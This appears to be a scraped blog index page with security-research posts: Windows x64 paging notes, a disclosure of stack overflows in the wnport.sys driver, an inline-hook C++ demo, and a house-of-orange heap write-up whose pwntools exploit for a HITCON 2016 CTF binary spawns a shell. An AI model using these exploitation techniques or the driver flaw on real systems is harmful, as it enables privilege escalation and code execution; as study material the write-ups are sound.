<ul>
<li>在PML4 四级页表中的表项索引 索引内内容是 PDPT 的基地址</li>
<li>拿着得到的PDPT的基地址 与在PDPT 页目录指针表的表项索引 得到PD的基地址</li>
<li>拿着得到的PD的基地址 与在PD页目录表的表项索引 得到PT的基地址</li>
<li>拿着得到的PT的基地址 与在PT页表的表项索引 得到Page 页的基地址</li>
<li>然后拿着页的基地址+ Offset 得到真实物理地址 12位最大就是0xFFF 所以一个页通常是0x1000</li>
<li>也就是0x0-0xFFF 4KB页大小</li>
</ul>
<p>在32位系统下，windows有两种分页机制，2-9-9-12分页以及10-10-12分页，而在64位下只有一种分页机制，那就是9-9-9-9-12分页</p>
<p>在x64体系中，只有48位是用来确定虚拟地址的，前面的16位成为符号拓展位，这16位只有为全1或者为全0两种情况。除了这两种情况之外的地址都是不合法的。</p>
<p>这16位为全1时表示这个地址是一个内核空间的地址，而为全0时表示这个地址是一个用户空间的地址。而在windows操作系统中，由于种种原因，又只用了这48位线性地址中的 44位 。也就是说windows分配的线性地址前20位都是要么为全0，要么为全1</p>
<h3 id="PS位"><a href="#PS位" class="headerlink" title="PS位"></a>PS位</h3><p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/640.webp" alt="图片"></p>
<p>除了四级页表后的PDPTE PDE 这两个页表都可能拥有PS位 </p>
<p>PS为一般在第7位</p>
<p>在PDPTE如果PS位为1 就认为是映射1GB 大页 </p>
<ul>
<li>PD PT Offset就变成一个大的Offset 然后PDPTE是这个1GB物理大页的基地址 </li>
<li>Offset大小就是 9+9+12 &#x3D; 30位大小(PD的页表的表项索引 + PT页表的表项索引 + Offset)</li>
</ul>
<p>如果在PDE PS位为1 那么就认为是映射2MB 大页</p>
<ul>
<li>PT Offset 就变成一个大的Offset 然后PDE是这个2MB大页的基地址</li>
<li>Offset 大小就是9 +12 &#x3D; 21 位 (PT页表的表项索引 + Offset) 0x1FFFFF字节</li>
</ul>
<h3 id="CR3寄存器"><a href="#CR3寄存器" class="headerlink" title="CR3寄存器"></a>CR3寄存器</h3><ul>
<li>x64 PML4基地址存储在CR3寄存器内。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code class="hljs plaintext">00007ff8`c5810000</code></pre>

<p>011111111</p>
<p>111100011</p>
<p>000101100</p>
<p>000010000</p>
<p>000000000000</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818153333044.png" alt="image-20250818153333044"></p>
<p>CR3是1ad000</p>
<p>第一层应该就是1ad000 + 255(8个1) * 8(每一个PML4E都是寄存器大小 8 字节) &#x3D; 0x1ad7f8</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818153940511.png" alt="image-20250818153940511"></p>
<p>得到PML4E8A0000000F27C867</p>
<p>在 x64 页表中，<strong>PML4E 的高 40 位存储下一级页表（PDPT）的物理基地址</strong>，低 12 位为属性标志（如存在位、读写权限等）</p>
<table>
<thead>
<tr>
<th></th>
<th>名称</th>
<th>值</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>pdpt</td>
<td>0x8a0000000f27c000</td>
<td>unsigned __int64</td>
</tr>
</tbody></table>
<p>得到PDPT基地址 f27c000</p>
<p>然后就是 f27c000+ 1e3 * 8 &#x3D; f27cf18</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818154733555.png" alt="image-20250818154733555"></p>
<pre><code class="hljs plaintext">0a000000`0f27d867</code></pre>

<p>相同手法获得PDT 基地址 f27d000</p>
<p>000101100 &#x3D; 0x2c 然后0x2c * 8 &#x3D; 0x160</p>
<p>PT在f27d160</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155627813.png" alt="image-20250818155627813"></p>
<p>pt基地址为f27e000 + 0x80 &#x3D; f27e080</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155729388.png" alt="image-20250818155729388"></p>
<p>最终结果0xf185000</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155755759.png" alt="image-20250818155755759"></p>
<pre><code class="hljs plaintext">Amd64VtoP: Virt 00007ff8c5810000, pagedir 00000000001ad000Amd64VtoP: PML4E 00000000001ad7f8Amd64VtoP: PDPE 000000000f27cf18Amd64VtoP: PDE 000000000f27d160Amd64VtoP: PTE 000000000f27e080Amd64VtoP: Mapped phys 000000000f185000Virtual address 7ff8c5810000 translates to physical address f185000.</code></pre>

<p>成功手算出了物理地址</p>
<h3 id="PTE-PDE"><a href="#PTE-PDE" class="headerlink" title="PTE -&gt; PDE"></a>PTE -&gt; PDE</h3><p>那么我们其实也可以反推</p>
<p>因为PTE &#x3D; </p>
<h2 id="Windows-内存管理"><a href="#Windows-内存管理" class="headerlink" title="Windows 内存管理"></a>Windows 内存管理</h2><h3 id="VAD"><a href="#VAD" class="headerlink" title="VAD"></a>VAD</h3><p>微软和Intel手册叫的不同</p>
<ul>
<li>PXE - PM4LE</li>
<li>PPE - PDPTE</li>
<li>PDE - PDE</li>
<li>PTE - PTE</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/" data-id="cmlh5cv7z0013skuaf95xeouc" data-title="windows 虚拟内存笔记" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" class="article-date">
  <time class="dt-published" datetime="2025-06-26T15:18:49.000Z" itemprop="datePublished">2025-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>The Wincor Nixdorf PORT IO Driver ‘wnport.sys’ was found to have multiple stack overflow vulnerabilities.</p>
<p>Driver Download Link <a target="_blank" rel="noopener" href="https://driverpack.io/en/hwids/ROOT%5CWNPORT">https://driverpack.io/en/hwids/ROOT%5CWNPORT</a></p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232106183.png" alt="image-20250626232106183"></p>
<p>The Driver ‘s <strong>Digital Signature</strong>. though it’s has not WHQL signature. is still permitted to be loaded by the latest version of Windows. However, for drivers with valid digital signatures issued before this policy update, Windows maintains compatibility by allowing them to bypass the WHQL requirement. </p>
<p>Therefore, this driver may still have an impact on the new 32-bit version of Windows.</p>
<p>The <code>IOCTL_DEVICEIO_CONTROL_FUNCTION</code> subroutine at <code>sub_11100</code> contains multiple IOCTL handlers that can trigger stack overflow conditions. Specifically, the following IOCTL codes are affected:</p>
<ul>
<li><code>0x80102040</code></li>
<li><code>0x80102044</code></li>
<li><code>0x80102050</code></li>
<li><code>0x80102054</code></li>
</ul>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232659410.png" alt="image-20250626232659410"></p>
<p>The <code>MaxCount</code> parameter actually represents the input buffer length, while <code>CommitSize</code> is constrained to a maximum of four <code>size_t</code> units. Consequently, a stack overflow will occur if the input buffer length exceeds the <code>CommitSize</code>.</p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233012724.png" alt="image-20250626233012724"></p>
<p>After using <code>DeviceIoControl</code> to send a large input buffer that exceeds the driver’s internal stack allocation , the system may encounter a stack overflow condition. This occurs because the driver’s IOCTL handler at sub_11100 processes the buffer without proper bounds checking, leading to memory corruption.</p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233051235.png" alt="image-20250626233051235"></p>
<p>This driver has triggered a <strong>PAGE_FAULT_NON_PAGE</strong> blue screen error, resulting in the system crashing., disrupting system operation by causing improper access to non-paged memory. Beyond the immediate system crash, its vulnerabilities can lead to memory corruption, enabling malicious entities to manipulate critical memory areas. In the worst - case scenario, it allows for arbitrary code execution, giving attackers the ability to run unauthorized commands with elevated privileges. What’s more concerning is that the driver’s IOCTL functions can be called by low - privileged programs, making it easier for attackers to exploit these flaws and undermine system integrity.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" data-id="cmlh5cv7v000jskuahnmp4lq4" data-title="Wincor Nixdorf PORT IO Driver Stack Overflow" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-windows-hook-inline-hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/23/windows-hook-inline-hook/" class="article-date">
  <time class="dt-published" datetime="2025-05-22T18:14:23.000Z" itemprop="datePublished">2025-05-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>inline hook 内联钩子是一种常用的钩子</p>
<p>其原理是直接把函数开头改成一个JMP ，后跟我们的hook函数地址</p>
<p>在hook函数里就随后恢复我们的原始字节 并跳到原函数执行 随后直接再次改成JMP挂钩</p>
<p>一般来说在windows内程序代码应该都是不可写的 需要使用VirtualProtect函数来改权限</p>
<pre><code class="hljs c">BOOL
WINAPI
<span class="hljs-title function_">VirtualProtect</span><span class="hljs-params">(</span>
<span class="hljs-params">    _In_  LPVOID lpAddress,</span>
<span class="hljs-params">    _In_  SIZE_T dwSize,</span>
<span class="hljs-params">    _In_  DWORD flNewProtect,</span>
<span class="hljs-params">    _Out_ PDWORD lpflOldProtect</span>
<span class="hljs-params">    )</span>
&#123;
    <span class="hljs-keyword">return</span> VirtualProtectFromApp (lpAddress, dwSize, flNewProtect, lpflOldProtect);
&#125;</code></pre>

<p>简单的poc</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>

BYTE original_code[<span class="hljs-number">14</span>];
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hook</span><span class="hljs-params">(ULONG_PTR addr, ULONG_PTR target)</span></span>;
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unhook</span><span class="hljs-params">(ULONG_PTR addr, BYTE* original)</span></span>;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">print_custom</span><span class="hljs-params">()</span> </span>&#123;
    std::cout &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">print_hook</span><span class="hljs-params">()</span> </span>&#123;
    std::cout &lt;&lt; <span class="hljs-string">&quot;you are hooked!&quot;</span> &lt;&lt; std::endl;
    <span class="hljs-built_in">unhook</span>((ULONG_PTR)&amp;print_custom, original_code);
    <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-built_in">hook</span>((ULONG_PTR)&amp;print_custom, (ULONG_PTR)&amp;print_hook);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;



<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    ULONG_PTR print_addr = (ULONG_PTR)&amp;print_custom;
    std::cout &lt;&lt;<span class="hljs-string">&quot;[+]print_addr=&gt;&quot;</span> &lt;&lt; std::hex &lt;&lt; print_addr &lt;&lt; std::endl;
    ULONG_PTR print_hook_addr = (ULONG_PTR)&amp;print_hook;
    std::cout &lt;&lt; <span class="hljs-string">&quot;[+]print_hook=&gt;&quot;</span> &lt;&lt; std::hex &lt;&lt; print_hook_addr &lt;&lt; std::endl;

    DWORD dwOldProtect;


    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)print_addr, <span class="hljs-number">0x233</span>, <span class="hljs-number">64</span>, &amp;dwOldProtect);
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(&amp;original_code), (<span class="hljs-type">void</span>*)(print_addr), <span class="hljs-number">14</span>);
    <span class="hljs-built_in">hook</span>(print_addr, print_hook_addr);
    
    <span class="hljs-type">int</span> qwq = <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-type">int</span> qwq1 = <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);

&#125;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hook</span><span class="hljs-params">(ULONG_PTR addr,ULONG_PTR target)</span></span>&#123;
    BYTE jmp_code[<span class="hljs-number">14</span>] = &#123;
   <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,  <span class="hljs-comment">// ; jmp qword ptr [rip + 0x0]</span>
   <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>  <span class="hljs-comment">// 后跟绝对地址</span>
    &#125;;
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)&amp;jmp_code[<span class="hljs-number">6</span>], (<span class="hljs-type">void</span>*)&amp;target, <span class="hljs-number">8</span>);
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(addr), &amp;jmp_code, <span class="hljs-number">14</span>);
&#125;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unhook</span><span class="hljs-params">(ULONG_PTR addr, BYTE* original)</span> </span>&#123;
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)addr, original, <span class="hljs-number">14</span>);
&#125;</code></pre>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/05/23/windows-hook-inline-hook/" data-id="cmlh5cv7z0016skua1znra677" data-title="windows hook - inline hook" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-house-of-orange-欧润吉" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/" class="article-date">
  <time class="dt-published" datetime="2025-05-08T05:32:29.000Z" itemprop="datePublished">2025-05-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>通过溢出修改top_chunk的size从而申请比修改后的size更大的chunk来触发sys_malloc，从而把原来的top_chunk给free掉 </p>
<p>然后就可以泄露LIBC地址和堆地址了</p>
<p>unsortedbin attack 已经在新版本libc被修复了 </p>
<pre><code class="hljs C">victim = unsorted_chunks(av)-&gt;bk;  <span class="hljs-comment">// 获取最后一个 chunk</span>
bck = victim-&gt;bk;                 <span class="hljs-comment">// 获取 victim 的 bk</span>
unsorted_chunks(av)-&gt;bk = bck;    <span class="hljs-comment">// 将 unsorted bin 的 bk 指向 victim 的 bk</span>
bck-&gt;fd = unsorted_chunks(av);    <span class="hljs-comment">// 关键操作：将 victim-&gt;bk-&gt;fd 设置为 unsorted bin 头 </span></code></pre>



<p>我们可以控制最后一个chunk的bk</p>
<p>因为这个攻击是利用了 往 最后一个chunk 的 bk 的fd (bk+0x10)写入东西</p>
<p>那么只要控制bk减少0x10 就可以往我们指定的target_address 写入 main_arena+96 或者+88 (一个很大的值)</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
<p>主要就是为了控制_IO_list_all 然后控制vtable 或者chain</p>
<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-comment">#from LibcSearcher import *</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
<span class="hljs-comment">#io = remote(&quot;node5.buuoj.cn&quot;,29087)</span>
io = process(<span class="hljs-string">&quot;./orange&quot;</span>)
e = ELF(<span class="hljs-string">&#x27;./orange&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
    attach(io)

s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():
    sla(<span class="hljs-string">b&quot;Your choice : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
    sa(<span class="hljs-string">&#x27;Name :&#x27;</span>,content)
    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size,content</span>):
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
    sa(<span class="hljs-string">&#x27;Name:&#x27;</span>,content)
    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
    sla(<span class="hljs-string">&#x27;4.show\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
    sla(<span class="hljs-string">&#x27;index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))
    
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))

add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
edit(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xfa1</span>)) <span class="hljs-comment"># modify top_chunk</span>
add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># cut the free chunk </span>
show()
ru(<span class="hljs-string">&#x27;Name of house : &#x27;</span>)
leak_main_arena = uu64(r(<span class="hljs-number">6</span>))
dlog(<span class="hljs-string">&quot;main_arena&quot;</span>,leak_main_arena)
libc_base = leak_main_arena -<span class="hljs-number">0x5e9</span> - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
io_2_1_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]
system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
dlog(<span class="hljs-string">&quot;list_all&quot;</span>,io_2_1_list_all)
edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
show()
ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
leak_heap_addr = uu64(r(<span class="hljs-number">6</span>))
dlog(<span class="hljs-string">&quot;heap_address&quot;</span>,leak_heap_addr)
payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span> + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>
payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(io_2_1_list_all-<span class="hljs-number">0x10</span>)<span class="hljs-comment">#unsorted bin attack</span>
payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)
payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>
payload+=p64(leak_heap_addr+<span class="hljs-number">0x530</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">10</span>
payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(leak_heap_addr+<span class="hljs-number">0x610</span>)+p64(system_addr)*<span class="hljs-number">8</span>
edit(<span class="hljs-built_in">len</span>(payload),payload)
<span class="hljs-comment">#bug()</span>
sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))


io.interactive()</code></pre>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/" data-id="cmlh5cv7x000oskua0i341wjb" data-title="house of orange(欧润吉)" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOCCHI-THE-ROCK/" rel="tag">BOCCHI THE ROCK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-file/" rel="tag">IO_file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">_IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILEt/" rel="tag">_IO_FILEt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/malloc-hook/" rel="tag">_malloc_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dirsearch/" rel="tag">dirsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastbin/" rel="tag">fastbin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-leak/" rel="tag">git leak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/header/" rel="tag">header</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap-feng-shui/" rel="tag">heap_feng_shui</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/match/" rel="tag">match</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/one-gadget/" rel="tag">one_gadget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li><li class="tag-list-item"><a class="tag-list-link" 